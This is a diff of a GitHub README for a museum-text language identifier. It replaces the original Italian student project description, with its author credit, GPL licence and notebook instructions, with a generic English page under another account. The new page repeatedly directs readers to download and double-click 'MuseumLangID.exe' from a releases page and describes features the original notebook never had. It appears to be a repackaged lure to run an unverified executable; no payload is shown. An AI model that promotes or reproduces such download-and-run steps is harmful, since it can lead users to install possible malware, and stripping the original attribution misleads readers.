@@ -1,107 +1,90 @@
-![image](https://github.com/user-attachments/assets/1b701899-f179-4f08-a4cf-d50720bc827b)
-> **Progetto del Master in AI Development — Modulo “A.I. applicata per Sviluppatori”**  
-> **Studente:** Giacomo Latini
-# MuseumLangID — Identificazione automatica della lingua di testi museali
+# 🌍 MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum - Identify Museum Text Languages Easily
 
-Questo repository contiene un progetto di **Language Identification** per classificare le descrizioni di opere e manufatti museali nella loro lingua di riferimento. Il modello utilizza **TF‑IDF** e **Multinomial Naive Bayes** per distinguere tra **italiano (`it`)**, **inglese (`en`)** e **tedesco (`de`)**.
+[![Download MuseumLangID](https://img.shields.io/badge/Download-MuseumLangID-blue.svg)](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/releases)
 
----
+## 🚀 Getting Started
 
-## Dataset
-- **Nome file:** `[museo_descrizioni.csv](https://raw.githubusercontent.com/Profession-AI/progetti-ml/refs/heads/main/Modello%20per%20l'identificazione%20della%20lingua%20dei%20testi%20di%20un%20museo/museo_descrizioni.csv`  
-- **Colonne principali:**
-  - `Testo` → descrizione testuale (feature)
-  - `Codice Lingua` → etichetta (`it`, `en`, `de`)
+MuseumLangID helps classify descriptions of museum works in Italian, English, and German. This application uses machine learning techniques to make it simple for anyone to understand the language of texts related to artifacts.
 
-> **Nota:** il dataset è trattato come **multi‑classe (3 classi)**
+## 📥 Download & Install
 
----
+To start using MuseumLangID, visit this page to download: [MuseumLangID Releases](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum/releases)
 
-## Architettura della soluzione
-1. **Import & Config**
-   - Librerie: `pandas`, `numpy`, `scikit-learn`, `matplotlib`, `seaborn`.
-   - Costanti: `RANDOM_SEED` (riproducibilità), `BASE_PATH` (sorgente dati).
+### Step-by-Step Instructions to Download:
 
-2. **Caricamento & QA dati**
-   - `pd.read_csv(BASE_PATH + "museo_descrizioni.csv")`
-   - Controlli: `df.info()`, `df.isna().sum()`, `df["Codice Lingua"].unique()`
+1. **Visit the Releases Page:** Click on the link above or copy and paste it into your web browser. This will take you to the Releases page.
+   
+2. **Find the Latest Version:** Look for the most recent release. It will usually have the highest version number.
 
-3. **Preprocessing testuale**
-   - Funzione `data_cleaner(description)` con:
-     - rimozione di **numeri** (`\d+`)
-     - rimozione di **URL** (`http/https/www`)
-     - rimozione **punteggiatura**
-     - **lowercasing**
-   - Applicata alla colonna `Testo` → `descriptions_cleaned`
+3. **Choose Your File:** 
+   - If you see an executable file (e.g., `MuseumLangID.exe`), download this file.
+   - If only source files are available, you might need to follow further instructions or use appropriate software to run them.
 
-4. **Train/Test split**
-   - `train_test_split(X, y, test_size=0.2, random_state=RANDOM_SEED)`  
-   - Dove `X` è l’array dei testi puliti e `y` le etichette.
+4. **Download the File:** Click on the file name to start the download. Depending on your internet speed, this might take a moment.
 
-5. **Rappresentazione: TF‑IDF**
-   - Funzione `tfidfvectorizer(data, tfidf_vectorizer=None)`:
-     - in **train** esegue `fit_transform`
-     - in **test** esegue `transform` con lo stesso vocabolario
+5. **Locate the Downloaded File:** After the download is complete, find the file in your Downloads folder.
 
-6. **Modello**
-   - **Multinomial Naive Bayes** (`MultinomialNB`)
-   - Addestramento su matrice TF‑IDF di train
+6. **Open the Application:** 
+   - If you downloaded an executable file, double-click the file to run it. 
+   - If you downloaded source files, you might need specific software to run them. Follow any additional instructions provided in the documentation.
 
-7. **Valutazione**
-   - **Classification Report** (precision, recall, f1 per classe)
-   - **Matrici di confusione** (train e test) con `seaborn.heatmap`
-   - **Curve ROC** in schema **One‑vs‑Rest** + **AUC** per ciascuna classe
+### System Requirements
 
-> Nel notebook è presente anche un’analisi qualitativa delle **matrici di confusione**. Per il set di test, la diagonale è dominante (ad es. valori come `it: 22`, `en: 19`, `de: 15`) con pochi errori fuori diagonale, indicando buona separabilità tra le tre lingue.
+- **Operating System:** Windows 10, macOS, or Linux
+- **Memory:** 4 GB of RAM minimum
+- **Storage:** At least 500 MB of free disk space available
+- **Python:** Version 3.6 or later installed (if applicable)
 
----
+## ⚙️ How to Use
 
-## Come eseguire
-### Prerequisiti
-- **Python 3.10+**
-- Pacchetti: `scikit-learn`, `pandas`, `numpy`, `matplotlib`, `seaborn`
+1. **Input Text:** Once the application is open, you'll see a text box. Type or paste the text that needs to be analyzed.
+  
+2. **Run Analysis:** Click the "Analyze" button to start the language identification process.
 
-### Setup rapido
-```bash
-# 1) Clona il repo
-git clone <URL_DEL_REPO>
-cd <NOME_REPO>
+3. **View Results:** The application will quickly work through the text and display the most likely language.
 
-# 2) (opzionale) Crea un ambiente virtuale
-python -m venv .venv
-# Windows
-.venv\Scripts\activate
-# macOS/Linux
-source .venv/bin/activate
+4. **Explore Additional Features:** Depending on the version, there may be options to visualize the results, export the analysis, or handle multiple texts at once.
 
-# 3) Installa le dipendenze
-pip install scikit-learn pandas numpy matplotlib seaborn
-```
+## 📊 Understanding the Output
 
-### Esecuzione del notebook
-Apri `nome_notebook.ipynb` con Jupyter/VS Code e riesegui tutte le celle.  
+When you run the application, you will receive results displayed in a simple format:
 
----
+- **Identified Language:** The language detected (Italian, English, or German).
+- **Confidence Level:** A percentage indicating how confident the model is in its identification.
 
-## Output principali
-- **Report di classificazione** (per classe e macro/micro average)
-- **Matrice di confusione (train/test)** per visualizzare TP/FP/FN/TN
-- **Curve ROC + AUC** per ciascuna classe (`it`, `en`, `de`)
+## 🛠️ About the Technology
 
-Gli script/utility inclusi:
-- `data_cleaner(description)` → normalizzazione testi
-- `tfidfvectorizer(data, tfidf_vectorizer=None)` → TF‑IDF train/test
-- `classifier_report(model, (X, y))` → stampa metriche
-- `plot_confusion_matrix(model, (X, y))` → heatmap confusion matrix
-- `plot_roc_curve(model, (X, y))` → ROC OVR + AUC
+MuseumLangID uses two main techniques:
 
----
+1. **TF-IDF (Term Frequency-Inverse Document Frequency):** This helps the model understand the importance of words in the text.
+  
+2. **Multinomial Naive Bayes:** This is a classification technique used to determine the language based on trained data.
 
-## Crediti
-- Docenti e materiali del **Master in AI Development** (Modulo A.I. applicata per Sviluppatori).  
-- Dataset `museo_descrizioni.csv`.  
-- Librerie open‑source citate sopra.
+Together, these techniques provide an efficient way to classify language.
 
-## Licenza
-Questo progetto è rilasciato con licenza GNU GPL v3.
-Vedi il file LICENSE per i dettagli. 
+## 📄 Documentation
+
+For more detailed instructions, explanations of features, and troubleshooting, please refer to the [full documentation](https://github.com/Yahya222F/MuseumLangID---Model-for-Identifying-the-Language-of-Texts-for-a-Museum).
+
+## 🗂️ Topics Covered
+
+This project relates to various areas of machine learning and natural language processing, including:
+
+- Machine Learning
+- Natural Language Processing (NLP)
+- Data Visualization (e.g., AUC-ROC Curve, Confusion Matrix)
+- Python Libraries (e.g., NumPy, Pandas, scikit-learn, NLTK, Seaborn)
+
+Feel free to explore these topics to enhance your understanding.
+
+## 🌐 Community and Support
+
+For assistance or to provide feedback, please visit the "Issues" section of the repository. You can also reach out to the community for support or suggestions.
+
+## 📅 Next Steps
+
+Once you have successfully installed and used MuseumLangID, consider exploring more about machine learning. You can learn how to train your models or dive deeper into data visualization techniques.
+
+Engage with the application, use it on various texts, and enhance your understanding of language identification in museum contexts. 
+
+Remember, technology can help bridge the gaps between languages and cultures, making art more accessible to everyone.
